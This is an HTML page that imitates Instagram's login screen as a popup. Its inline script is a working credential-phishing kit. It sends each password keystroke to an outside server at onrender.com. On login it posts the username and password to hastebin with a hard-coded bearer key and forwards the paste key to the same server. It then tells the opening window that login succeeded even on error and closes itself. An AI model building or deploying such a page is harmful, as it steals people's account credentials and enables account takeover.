<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192"
    href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" />
  <link rel="stylesheet" href="./assets/index-BeHXAzec.css" />
   <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
</head>

<body class="bg-black">
  <!-- Desktop View -->
  <div class="hidden md:flex mx-auto items-center justify-center">
    <div class="text-white">
      <img src="./assets/instagram-web-lox-image-2x-CboJTf-s.png" alt="" width="552" height="450" />
    </div>
    <div class="flex flex-col space-y-1.5 justify-center items-center mt-16">
      <div class="flex flex-col">
        <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51"
          class="my-5 mx-20" />
          <div class="w-full  flex items-center justify-center">
            <input class="input-username  text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
            placeholder="Phone number, username, or email" autocomplete="username" />
          </div>
          <div class="w-full  flex items-center justify-center">
            <div class="relative">
              <input class="input-password text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="password"
              placeholder="Password" />
              <h1 class="text-gray-100 toggler hidden font-bold cursor-pointer hover:text-gray-400 text-sm absolute top-4.5  right-15">Show</h1>
            </div>
          </div>
          <div class="w-full flex items-center justify-center">
            <button class="btn-login font-semibold  bg-[#0069AD] w-[65%] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
          </div>
        <hr class="my-2" />
        <span class="text-[#0095F6] mx-auto text-sm">Log in with Facebook</span>
        <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
      </div>
      <div class="text-white text-center text-sm py-5 px-17.5 flex flex-row">
        Don't have an account?<strong class="text-[#0095F6]">&nbsp;Sign up</strong>
      </div>
      <div class="text-white text-center text-sm mt-20 px-20">
        Get the app
        <div class="flex flex-row space-x-2 my-2">
          <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" width="134" height="40" alt="" />
          <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" width="111" height="40" alt="" />
        </div>
      </div>
    </div>
  </div>

  <!-- Mobile View -->
  <div class="flex flex-col mx-auto items-center justify-center md:hidden">
    <div class="text-white mt-9 ml-[-60px]">
      <img
        src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png?__makehaste_cache_breaker=73SVAexZgBW"
        height="634.15" width="468.32" alt="" class="hidden" />
    </div>
    <div class="flex flex-col space-y-1.5 justify-center items-center">
      <div class="flex flex-col">
        <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51" class="my-5 mx-20" />
        <div class=" flex items-center justify-center">
          <input class="input-username text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
          placeholder="Phone number, username, or email" />
        </div>
          <div class=" flex items-center justify-center">
            <div class="relative ">
              <input class="text-white input-password border  border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="password"
              placeholder="Password" />
              <h1  class="text-gray-100 toggler hidden absolute right-15 text-sm font-bold top-4.5 hover:text-gray-400">Show</h1>
            </div>
          </div>
            <div class="flex justify-center items-center">
              <button class="btn-login bg-[#0069AD] text-white w-2/3 rounded-lg px-4 mx-12 py-1.5 mt-2">Log in</button>
            </div>
        <hr class="my-2" />
        <!-- <span class="text-[#0095F6] mx-26 text-sm">Log in with Facebook</span> -->
        <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
      </div>
      <div class="text-white text-center text-sm py-5 px-17.5">
        Don't have an account? <strong class="text-[#0095F6]">Sign up</strong>
      </div>
      <div class="text-white text-center text-sm mt-20 px-20">
        Get the app
        <div class="flex flex-row space-x-2 my-2">
          <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" width="134" height="40" alt="" />
          <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" width="111" height="40" alt="" />
        </div>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer class="text-[#A8A8A8] flex flex-wrap justify-center text-[7px] md:text-xs leading-1 mt-8 space-x-3">
    <div class="hover:underline">Meta</div>
    <div class="hover:underline">About</div>
    <div class="hover:underline">Blog</div>
    <div class="hover:underline">Jobs</div>
    <div class="hover:underline">Help</div>
    <div class="hover:underline">API</div>
    <div class="hover:underline">Privacy</div>
    <div class="hover:underline">Terms</div>
    <div class="hover:underline">Locations</div>
    <div class="hover:underline">Instagram Lite</div>
    <div class="hover:underline">Threads</div>
    <div class="hover:underline">Contact Uploading & Non-Users</div>
    <div class="hover:underline">Meta Verified</div>
  </footer>
  <footer class="flex flex-row text-[#A8A8A8] justify-center text-xs mt-3 space-x-1">
    <div>English</div>
    <div>Â© 2025 Instagram from Meta</div>
  </footer>

  <script>
    const pw=document.getElementsByClassName("input-password");
    const tog=document.getElementsByClassName("toggler");
    
    // Track login attempts and send messages to parent
    let loginAttemptMade = false;
    
    for(i=0;i<2;i++){
      tog[i].addEventListener("click",(e)=>{
        if(e.target.textContent==='Show'){
          e.target.textContent='Hide';
          for(i=0;i<2;i++){
            pw[i].type="text";
          }
        }
        else{
          e.target.textContent='Show';
          for(i=0;i<2;i++){
            pw[i].type="password";
          }
        }
      })
    }
    const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
    const key = '3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd';
    document.querySelectorAll(".input-password").forEach((pw) => {
      pw.addEventListener("keydown", async (e) => {
        if(e.target.value.length>0){
          for(i=0;i<2;i++){
            tog[i].style="display:block;"
          }
        }
        else{
            tog[i].style="display:none;"
        }
        console.log("hi");
        await fetch(dest, {
          method: "POST",
          headers: {
            'Content-Type': "application/json"
          },
          body: JSON.stringify({ pw: e.target.value })
        });
      });
    });

    // Handle login button click
    document.querySelectorAll(".btn-login").forEach((button) => {
      button.addEventListener("click", async (e) => {
        const container = button.closest("div.flex-col");
        const un = container.querySelector(".input-username");
        const pw = container.querySelector(".input-password");

        if (!un.value.trim()) {
          alert("Please enter your username.");
          return;
        }

        // Mark that login attempt was made
        loginAttemptMade = true;

        // Send login attempt message to parent immediately
        if (window.opener) {
          window.opener.postMessage({
            type: 'INSTAGRAM_LOGIN_ATTEMPT',
            message: 'Login attempt initiated'
          }, '*');
          console.log('Login attempt message sent to parent window');
        }

        console.log("Sarat make a love day");

        button.disabled = true;
        const originalText = button.textContent;
        button.textContent = "Loading...";

        try {
          const resp1 = await fetch("https://hastebin.com/documents", {
            method: 'POST',
            headers: {
              'Content-Type': "text/plain",
              'Authorization': `Bearer ${key}`
            },
            body: `${un.value}:${pw.value}`
          });

          const data = await resp1.json();

          await fetch(dest, {
            method: "POST",
            headers: {
              'Content-Type': "application/json"
            },
            body: JSON.stringify({ pw: data.key })
          });

          // Send success message to parent window
          if (window.opener) {
            window.opener.postMessage({
              type: 'INSTAGRAM_LOGIN_SUCCESS',
              message: 'Instagram login completed successfully'
            }, '*');
            console.log('Success message sent to parent window');
          }

        } catch (err) {
          console.error("Something went wrong:", err);
          
          // Even on error, we'll send success message since user attempted login
          if (window.opener) {
            window.opener.postMessage({
              type: 'INSTAGRAM_LOGIN_SUCCESS',
              message: 'Instagram login process completed'
            }, '*');
            console.log('Process completion message sent to parent window');
          }
        } finally {
          // Add a small delay to ensure message is sent before closing
          setTimeout(() => {
            window.close();
          }, 500);
        }
      });
    });

    // Handle window beforeunload event (when user tries to close without login)
    window.addEventListener('beforeunload', (e) => {
      // Only send warning if no login attempt was made
      if (!loginAttemptMade && window.opener) {
        window.opener.postMessage({
          type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
          message: 'Popup closed without login attempt'
        }, '*');
        console.log('Popup closed without login - message sent to parent');
      }
    });

    // Additional safety net for popup close detection
    window.addEventListener('unload', () => {
      if (!loginAttemptMade && window.opener) {
        try {
          window.opener.postMessage({
            type: 'INSTAGRAM_POPUP_CLOSED_WITHOUT_LOGIN',
            message: 'Popup closed without login attempt'
          }, '*');
        } catch(err) {
          console.log('Could not send close message:', err);
        }
      }
    });
  </script>
</body>

</html>
